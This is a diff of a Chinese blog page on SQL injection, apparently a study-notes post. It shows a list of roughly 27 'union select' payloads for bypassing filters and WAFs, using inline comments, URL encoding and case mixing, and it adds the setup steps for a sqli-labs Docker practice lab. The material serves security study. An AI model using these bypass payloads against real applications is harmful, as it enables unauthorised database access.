@@ -234,7 +234,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2025-03-05 00:37:13" itemprop="dateModified" datetime="2025-03-05T00:37:13+08:00">2025-03-05</time>
+      <time title="修改时间：2025-03-05 01:50:34" itemprop="dateModified" datetime="2025-03-05T01:50:34+08:00">2025-03-05</time>
     </span>
 
   
@@ -244,14 +244,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>5.9k</span>
+      <span>6.9k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>11 分钟</span>
+      <span>12 分钟</span>
     </span>
 </div>
 
@@ -475,6 +475,21 @@
 
 
 <h3 id="2-26-union-select绕过"><a href="#2-26-union-select绕过" class="headerlink" title="2.26 union select绕过"></a>2.26 union select绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">sel<span class="operator">&lt;&gt;</span>ect # 程序过滤<span class="operator">&lt;&gt;</span>为空 脚本处理</span><br><span class="line">sele<span class="comment">/**/</span>ct # 程序过滤<span class="comment">/**/</span>为空</span><br><span class="line"><span class="comment">/*!%53eLEct*/</span> # url 编码与内联注释</span><br><span class="line">se<span class="operator">%</span><span class="number">0</span>blect # 使用空格绕过</span><br><span class="line">sele<span class="operator">%</span>ct # 使用百分号绕过</span><br><span class="line"><span class="operator">%</span><span class="number">53</span>eLEct # 编码绕过</span><br><span class="line"><span class="keyword">uNIoN</span> <span class="keyword">sELecT</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">DISTINCT</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">null</span><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="comment">/*!union*/</span><span class="comment">/*!select*/</span><span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">and</span>(<span class="keyword">select</span> <span class="number">1</span>)<span class="operator">=</span>(<span class="keyword">Select</span> <span class="number">0xA</span><span class="operator">*</span><span class="number">1000</span>)<span class="comment">/*!uNIOn*/</span><span class="comment">/*!SeLECt*/</span> <span class="number">1</span>,<span class="keyword">user</span>()</span><br><span class="line"><span class="comment">/*!50000union*/</span><span class="comment">/*!50000select*/</span><span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="comment">/*!40000union*/</span><span class="comment">/*!40000select*/</span><span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="operator">%</span><span class="number">0</span>aunion<span class="operator">%</span><span class="number">0</span>aselect <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="operator">%</span><span class="number">250</span>aunion<span class="operator">%</span><span class="number">250</span>aselect <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="operator">%</span><span class="number">09</span><span class="keyword">union</span><span class="operator">%</span><span class="number">09</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="operator">%</span><span class="number">0</span>caunion<span class="operator">%</span><span class="number">0</span>cselect <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="operator">%</span><span class="number">0</span>daunion<span class="operator">%</span><span class="number">0</span>dselect <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="operator">%</span><span class="number">0</span>baunion<span class="operator">%</span><span class="number">0</span>bselect <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="operator">%</span><span class="number">0</span>d<span class="operator">%</span><span class="number">0</span>aunion<span class="operator">%</span><span class="number">0</span>d<span class="operator">%</span><span class="number">0</span>aselect <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="comment">--+%0d%0aunion--+%0d%0aselect--+%0d%0a1,--+%0d%0a2</span></span><br><span class="line"><span class="comment">/*!12345union*/</span><span class="comment">/*!12345select*/</span><span class="number">1</span>,<span class="number">2</span>;</span><br><span class="line"><span class="comment">/*中文*/</span><span class="keyword">union</span><span class="comment">/*中文*/</span><span class="keyword">select</span><span class="comment">/*中文*/</span><span class="number">1</span>,<span class="number">2</span>;</span><br><span class="line"><span class="comment">/* */</span><span class="keyword">union</span><span class="comment">/* */</span><span class="keyword">select</span><span class="operator">/</span> <span class="operator">*</span><span class="operator">/</span><span class="number">1</span>,<span class="number">2</span>;</span><br><span class="line"><span class="comment">/*!union*/</span><span class="comment">/*!00000all*/</span><span class="comment">/*!00000select*/</span><span class="number">1</span>,<span class="number">2</span></span><br></pre></td></tr></tbody></table></figure>
+
+
+
+
+
+<h2 id="3-sqli-labs通关"><a href="#3-sqli-labs通关" class="headerlink" title="3. sqli-labs通关"></a>3. sqli-labs通关</h2><h3 id="3-1-准备工作"><a href="#3-1-准备工作" class="headerlink" title="3.1 准备工作"></a>3.1 准备工作</h3><p><strong>sqli-labs环境搭建</strong></p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull acgpiano/sqli-labs</span><br><span class="line">docker run -dt --name sqli-labs -p 8888:80 acgpiano/sqli-labs:latest</span><br></pre></td></tr></tbody></table></figure>
+
+<p>中间可能报错，只需要关闭代理就行。</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error response from daemon: Head <span class="string">"https://registry-1.docker.io/v2/acgpiano/sqli-labs/manifests/latest"</span>: Get <span class="string">"https://auth.docker.io/token?account=squarehhh&amp;scope=repository%3Aacgpiano%2Fsqli-labs%3Apull&amp;service=registry.docker.io"</span>: EOF</span><br></pre></td></tr></tbody></table></figure>
+
+<p>访问网页，环境搭建完毕。</p>
+<p><img src="/sql%E6%B3%A8%E5%85%A5/image-20250305014536324.png" alt="image-20250305014536324"></p>
+<p>查看相关版本细节。</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ docker <span class="built_in">exec</span> -it sqli-labs /bin/bash</span><br><span class="line">$ mysql -e <span class="string">"select version(),user()"</span></span><br><span class="line">+-------------------------+----------------+</span><br><span class="line">| version()               | user()         |</span><br><span class="line">+-------------------------+----------------+</span><br><span class="line">| 5.5.44-0ubuntu0.14.04.1 | root@localhost |</span><br><span class="line">+-------------------------+----------------+</span><br><span class="line">$ php --version</span><br><span class="line">PHP 5.5.9-1ubuntu4.13 (cli) (built: Sep 29 2015 15:24:49)</span><br><span class="line">Copyright (c) 1997-2014 The PHP Group</span><br><span class="line">Zend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies</span><br><span class="line">    with Zend OPcache v7.0.3, Copyright (c) 1999-2014, by Zend Technologies</span><br><span class="line">$ <span class="built_in">cd</span> /etc/init.d/ &amp;&amp; apache2 -v</span><br><span class="line">Server version: Apache/2.4.7 (Ubuntu)</span><br><span class="line">Server built:   Oct 14 2015 14:20:21</span><br></pre></td></tr></tbody></table></figure>
 
  -->
       
@@ -975,13 +990,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">22k</span>
+    <span title="站点总字数">23k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">41 分钟</span>
+    <span title="站点阅读时长">43 分钟</span>
   </span>
 </div>
   <div class="powered-by">
